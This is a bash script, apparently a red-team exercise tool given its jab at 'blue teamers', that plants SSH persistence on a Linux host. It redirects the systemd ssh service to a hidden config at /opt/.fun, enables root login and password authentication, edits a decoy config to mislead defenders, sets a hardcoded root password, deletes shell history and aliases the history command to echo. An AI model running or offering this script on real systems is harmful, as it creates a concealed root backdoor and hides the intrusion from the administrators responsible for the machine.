#!/bin/bash

# Function to update the SSH configuration
update_ssh_config() {
    local config_file="$1"

    echo "Modifying SSH configuration..."

    # Backup the original configuration
    if [ ! -f "${config_file}.bak" ]; then
        cp "$config_file" "${config_file}.bak"
        echo "Backup of SSH config created at ${config_file}.bak"
    else
        echo "Backup already exists at ${config_file}.bak"
    fi

    # Enable root login
    if grep -q "^#PermitRootLogin" "$config_file"; then
        sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' "$config_file"
    elif grep -q "^PermitRootLogin" "$config_file"; then
        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$config_file"
    else
        echo "PermitRootLogin yes" >> "$config_file"
    fi

    # Enable password authentication
    if grep -q "^#PasswordAuthentication" "$config_file"; then
        sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication yes/' "$config_file"
    elif grep -q "^PasswordAuthentication" "$config_file"; then
        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$config_file"
    else
        echo "PasswordAuthentication yes" >> "$config_file"
    fi

    echo "SSH configuration updated."
}

# Restart SSH service
restart_ssh_service() {
    echo "Restarting SSH service..."
    if systemctl restart ssh; then
        echo "SSH service restarted successfully."
    else
        echo "Failed to restart SSH service. Please check for errors."
        exit 1
    fi
}

update_ssh_service() {
    local new_config_file="$1"
    local service_file="$2"

    echo "Updating SSH service to use the new configuration file: $new_config_file"

    # Validate input
    if [ -z "$new_config_file" ] || [ -z "$service_file" ]; then
        echo "Error: Missing arguments. Usage: update_ssh_service <new_config_file> <service_file>"
        return 1
    fi

    # Check if the new configuration file exists
    if [ ! -f "$new_config_file" ]; then
        echo "Error: New configuration file not found at $new_config_file"
        return 1
    fi

    # Check if the service file exists
    if [ ! -f "$service_file" ]; then
        echo "Error: Service file not found at $service_file"
        return 1
    fi

    # Backup the original service file
    if [ ! -f "${service_file}.bak" ]; then
        cp "$service_file" "${service_file}.bak"
        echo "Backup of SSH service file created at ${service_file}.bak"
    else
        echo "Backup already exists at ${service_file}.bak"
    fi

    # Update the service file to use the new config file
    sed -i "s|ExecStart=/usr/sbin/sshd -D.*|ExecStart=/usr/sbin/sshd -D -f ${new_config_file}|" "$service_file"

    # Reload the systemd daemon and restart the SSH service
    echo "Reloading systemd daemon and restarting SSH service..."
    systemctl daemon-reload
    if systemctl restart ssh; then
        echo "SSH service successfully restarted with the new configuration file."
    else
        echo "Error: Failed to restart SSH service. Check the configuration and logs for details."
        return 1
    fi

    if systemctl enable ssh; then
        echo "SSH service successfully enabled."
    else
        echo "Error: Failed to enable SSH service. Check the configuration and logs for details."
        return 1
    fi

    return 0
}

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root."
    exit 1
fi

# Execute the functions
ORIG_SSH_CONF="/etc/ssh/sshd_conf"
NEW_SSH_CONF="/opt/.fun"
cp /etc/ssh/sshd_config "$NEW_SSH_CONF"

update_ssh_service "$NEW_SSH_CONF" "/usr/lib/systemd/system/ssh.service"
update_ssh_config "$NEW_SSH_CONF"
update_ssh_config "$ORIG_SSH_CONF" # Let blue teamers fix fake config
restart_ssh_service

echo "root:H4ckB4ckJ4ck" | chpasswd

rm ~/.zsh_history
alias history="echo"
